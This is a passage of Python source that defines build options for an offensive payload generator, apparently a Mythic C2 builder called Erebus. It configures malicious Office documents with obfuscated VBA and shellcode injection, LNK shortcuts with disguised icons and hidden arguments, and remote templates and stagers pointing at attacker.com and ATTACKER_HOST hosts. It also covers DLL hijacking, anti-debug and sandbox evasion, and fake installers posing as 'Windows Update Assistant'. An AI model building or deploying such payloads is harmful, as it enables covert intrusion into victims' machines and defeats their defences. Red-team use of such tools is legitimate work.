                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="AppDomain"),
            ]
        ),

        BuildParameter(
            name="0.9m AppDomain Remote URL",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Optional remote URL to fetch the AppDomain Manager DLL (HTTP/S or WebDAV). Leave blank for local side-by-side DLL mode. Remote mode requires strong-name signing.",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="AppDomain"),
            ]
        ),

        BuildParameter(
            name="0.9n LNK Icon",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Icon disguise for the LNK shortcut. Resolves via environment-variable paths on the target host.",
            choices=["pdf", "word", "excel", "powerpoint", "outlook", "onenote", "folder", "document", "notepad", "edge", "generic"],
            default_value="pdf",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="LNK"),
            ]
        ),

        BuildParameter(
            name="0.9o LNK Argument Pad",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Number of leading space characters prepended to arguments to push them off-screen in the shortcut Properties dialog (argument hiding). Recommended: 260.",
            default_value="260",
            required=False,
            hide_conditions=[
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.NotEQ, value="LNK"),
            ]
        ),

  # MalDocs - Excel Backdooring
        BuildParameter(
            name="0.9 Create MalDoc",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create/Backdoor Document documents, export VBA module only, Generate All or disable MalDoc generation",
            choices=["None", "Create/Backdoor Document", "VBA Module Only", "Build Matrix"],
            default_value="None",
            required=False,
            hide_conditions=[
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9a MalDoc Type",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create new Excel document or backdoor an existing one",
            choices=["Create New", "Backdoor Existing"],
            default_value="Create New",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9b Excel Source File",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.File,
            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9a MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9c VBA Execution Trigger",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA macro execution trigger method",
            choices=["AutoOpen", "OnClose", "OnSave"],
            default_value="AutoOpen",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9d Excel Document Name",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description="Name/title for the Excel document",
            default_value="Invoice",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9e Obfuscate VBA",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate VBA code to evade AV/EDR detection",
            default_value=True,
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f MalDoc Injection Type",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
            choices=["Command Execution", "Shellcode Injection"],
            default_value="Command Execution",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f1 MalDoc Trigger Binary",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description="Executable to run when the VBA trigger fires (Command Execution mode only).",
            default_value="C:\\Windows\\System32\\conhost.exe",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f2 MalDoc Trigger Command",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description="Arguments passed to the trigger binary (Command Execution mode only).",
            default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9g VBA Loader Technique",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (self-APC), AddressOfEntryPoint (overwrite child entry point, no RWX), EarlyBird (suspended process APC hijack)",
            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "AddressOfEntryPoint Injection", "Early-Bird Injection"],
            default_value="VirtualAlloc + CreateThread",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9p MalDoc Output Format",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Output format for the VBA maldoc. "
                "xlsm/xlsx/xlam: Excel formats (require erebus_helper on Windows). "
                "docm/doc: Word formats. "
                "pptm: PowerPoint macro-enabled presentation (pure Python). "
                "ppam: PowerPoint Add-In - persists in AddIns list, re-executes on every PowerPoint launch. "
                "docx-remote-template: clean DOCX that fetches attacker DOTM on open (no macros in attachment)."
            ),
            choices=["xlsm", "xlsx", "xlam", "docm", "doc", "pptm", "ppam", "docx-remote-template"],
            default_value="xlsm",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9q DOTM Remote URL",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description=(
                "URL of the attacker-hosted DOTM template fetched by Word on Document_Open. "
                "Only used when MalDoc Output Format = docx-remote-template. "
                "Example: https://cdn.attacker.com/template.dotm"
            ),
            default_value="https://attacker.com/template.dotm",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
                HideCondition(name="0.9p MalDoc Output Format", operand=HideConditionOperand.NotEQ, value="docx-remote-template"),
            ]
        ),

        BuildParameter(
            name="0.9r Matrix Loaders",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description=(
                "Comma-separated VBA loader techniques for the matrix build. "
                "Valid: createthread, enumlocales, queueuserapc, process_hollowing. "
                "Leave blank to include all four."
            ),
            default_value="createthread,enumlocales,queueuserapc,process_hollowing",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9s Matrix Triggers",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description=(
                "Comma-separated VBA execution triggers for the matrix build. "
                "Valid: AutoOpen, OnClose, OnSave. "
                "Leave blank to include all three."
            ),
            default_value="AutoOpen,OnClose,OnSave",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9t Matrix Formats",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description=(
                "Comma-separated document formats for the matrix build. "
                "Valid: xlsm, xlam, docm, pptm, ppam. "
                "Leave blank to include all five."
            ),
            default_value="xlsm,xlam,docm,pptm,ppam",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9u Matrix Zip Output",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.Boolean,
            description="Pack the full matrix output directory into a single .zip after build.",
            default_value=True,
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.NotEQ, value="Build Matrix"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9v HTTP Stager URL",
            group_name="12 - MalDoc",
            parameter_type=BuildParameterType.String,
            description=(
                "Optional: stage the shellcode via Mythic instead of embedding it in VBA. "
                "Provide the Mythic server (or redirector) URL - e.g. https://192.168.93.132:7443. "
                "Builder RC4-encrypts shellcode, uploads to Mythic file store, constructs "
                "https://<host>/direct/download/<uuid> and embeds it in a tiny VBA downloader. "
                "No shellcode in VBA source - bypasses module size limits for any payload size. "
                "Leave blank to embed shellcode normally."
            ),
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Shellcode Injection"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File Inclusion",
            group_name="13 - Decoy",
            parameter_type = BuildParameterType.Boolean,
            description = "Check whether you want the decoy file in the final payload or not",
            default_value = False,
            required=True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File",
            group_name="13 - Decoy",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="0.13 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "1.0 DLL Hijacking",
            group_name="9 - DLL Hijack",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0a Hijack Loader Architecture",
            group_name="9 - DLL Hijack",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the DLL loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0b Hijack Build Configuration",
            group_name="9 - DLL Hijack",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the build configuration for the DLL hijack payload",
            choices = ["release", "debug"],
            default_value = "release",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        # DLL Hijack Built-in Guardrails
        BuildParameter(
            name = "1.1 Use Built-in Guardrails",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Use built-in anti-debugging and environment checks instead of custom code",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.1a Check IsDebuggerPresent",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1b Check Remote Debugger",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1c Check Debugger Processes",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1d Check Hardware Breakpoints",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1e Check Timing Anomalies",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1f Hostname Whitelist",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1g Block Analysis Hostnames",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1h Block Analysis Usernames",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1i IP Whitelist",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1j IP Blacklist",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1k Domain Whitelist",
            group_name="10 - Hijack Guardrails",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        # Shellcrypt
        BuildParameter(
            name = "2.0 Compression Type",
            group_name="15 - Payload Protection",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose a compression type for the shellcode.",
            choices = [
                "LZNT1",
                "RLE",
                "NONE",
            ],
            default_value="NONE"
        ),

# TODO:
# Add more decryption support to loaders
        BuildParameter(
            name = "2.1 Encryption Type",
            group_name="15 - Payload Protection",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encryption type for the shellcode.",
            choices = [
                "AES_ECB",
                "AES_CBC",
                "RC4",
                "XOR",
            ],
            default_value = "RC4"
        ),

        BuildParameter(
            name = "2.2 Encryption Key",
            group_name="15 - Payload Protection",
            parameter_type = BuildParameterType.String,
            description = """Choose an encryption key. A random one will be
generated if none have been entered.""",
            default_value="NONE"
        ),

        BuildParameter(
            name = "2.3 Encoding Type",
            group_name="15 - Payload Protection",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Choose an encoding type for the shellcode.",
            choices = [
                "ALPHA32",
                "ASCII85",
                "BASE64",
                "WORDS256",
                "NONE",
            ],
            default_value="NONE"
        ),

        # Archive
        BuildParameter(
            name = "3.0 Container Type",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Primary container / execution layer.\n"
                "Electron and MSI extract and launch the payload automatically on open.\n"
                "ISO, VHD, ZIP, and 7z are transport containers that expose the payload file.\n"
                "Combine with '3.0T Outer Transport' to chain (e.g. Electron inside ISO)."
            ),
            choices = ["ISO", "7z", "Zip", "MSI", "Electron", "VHD", "AppInstaller"],
            default_value = "Zip",
        ),

        BuildParameter(
            name = "3.0T Outer Transport",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Optional outer transport wrapper. Wraps the primary container inside an\n"
                "additional archive or disk image AFTER it is built.\n\n"
                "Useful chains:\n"
                "  Electron → ISO  : ISO disc containing setup.exe (MOTW bypass)\n"
                "  Electron → VHD  : VHD disc containing setup.exe (ISO-policy bypass)\n"
                "  MSI     → ISO  : ISO disc containing installer.msi\n"
                "  MSI     → VHD  : VHD disc containing installer.msi\n"
                "  Zip     → ISO  : ISO containing a ZIP archive\n"
                "Set to 'None' for no outer wrapping (default)."
            ),
            choices = ["None", "ISO", "VHD", "ZIP", "7z"],
            default_value = "None",
        ),

        BuildParameter(
            name="3.AI0 MSIX Hosting URL",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description=(
                "Full HTTPS URL where the operator will host the signed MSIX package.\n"
                "Example: https://cdn.yourdomain.com/update/app.msix\n"
                "Erebus generates the package structure; run build_msix.bat on Windows\n"
                "to sign it, then upload to this URL before delivering .appinstaller."
            ),
            default_value="https://ATTACKER_HOST/update/app.msix",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
            ]
        ),

        BuildParameter(
            name="3.AI1 MSIX Package Name",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="MSIX identity package name. Shown in Settings > Apps. No spaces.",
            default_value="Microsoft.WindowsUpdate",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
            ]
        ),

        BuildParameter(
            name="3.AI2 MSIX Display Name",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Friendly display name shown in App Installer UI and Settings > Apps.",
            default_value="Windows Update Assistant",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="AppInstaller"),
            ]
        ),

        # Electron fake-installer container parameters (hidden unless Electron selected)
        BuildParameter(
            name = "3.E0 Electron Product Name",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Display name shown in the fake installer window and NSIS metadata",
            default_value = "Acme Installer",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E1 Electron Publisher",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Publisher string embedded in the installer metadata",
            default_value = "Acme Corporation",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E2 Electron Version",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Product version embedded in the installer",
            default_value = "1.0.0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E3 Electron Architecture",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Target architecture for the Electron NSIS installer",
            choices = ["x64", "ia32"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E4 Electron Entry Format",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Which spawn mechanism the wizard uses at install time:\n"
                "exe = CreateProcess on the embedded loader exe (Shellcode Loader / ClickOnce)\n"
                "dll = rundll32.exe <dll>,<entry> (Shellcode Loader DLL format)\n"
                "xll = excel.exe /e <xll> (Shellcode Loader XLL format)"
            ),
            choices = ["exe", "dll", "xll"],
            default_value = "exe",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E5 Electron DLL Entry Point",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "rundll32 entry point name (only used when Entry Format = dll)",
            default_value = "DllMain",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E4 Electron Entry Format", operand=HideConditionOperand.NotEQ, value="dll"),
            ]
        ),
        BuildParameter(
            name = "3.E7 Electron File Description",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "PE file description string shown on the Details tab of the "
                "exe's properties dialog (maps to package.json.description)."
            ),
            default_value = "Setup",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E8 Electron Copyright",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Legal copyright string embedded in the PE resources "
                "(maps to electron-builder.yml.copyright)."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E6a Electron Custom Icon",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.File,
            description = (
                "Optional PNG to use as the fake-installer window + exe icon.\n"
                "If omitted, the default Erebus icon is used. Image should be "
                "square and at least 256x256; it is converted to a multi-size "
                "ICO at build time."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E6b Electron Payload Zip",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.File,
            description = (
                "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
                "the Mythic-compiled loader. The archive must contain erebus.exe, erebus.dll,\n"
                "and/or erebus.xll at its root. Files are extracted directly into payload/\n"
                "before containerisation, replacing any compiled output."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),

        BuildParameter(
            name = "3.E9 Enable Electron Guardrails",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Master switch for the Electron wrapper's anti-sandbox guardrails. "
                "When enabled, the wizard defers staging the loader tree to "
                "%TEMP%\\inst-<uuid> until after a dwell time, real user mouse "
                "movement, and every enabled environment check has passed."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.E9a Dwell Time (ms)",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Minimum time (ms) the wizard must be visible before the Install "
                "button becomes actionable. Defeats rapid-click sandbox detonators. "
                "0 disables the dwell gate."
            ),
            default_value = "2500",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9b Require Mouse Movement",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Require a real mousemove event (non-zero movementX/Y delta) "
                "inside the wizard window before the Install button is enabled. "
                "Filters synthetic-event automation that clicks buttons without "
                "moving the pointer."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9c Check Debugger",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if a Node inspector / debugger is attached to "
                "the Electron main process at Install click time."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9d Check Sandbox Env Vars",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if environment variables from common sandbox "
                "frameworks are present (Sandboxie, Cuckoo, Joe Sandbox, etc.)."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9e Check Default Bad Usernames",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if the current username is a well-known sandbox "
                "default (sandbox, malware, analyst, WDAGUtilityAccount, ...)."
            ),
            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9f Check Default Bad Hostnames",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Refuse to stage if the current hostname contains common sandbox "
                "substrings (sandbox, cuckoo, hybrid-analysis, vm, vbox, ...)."
            ),
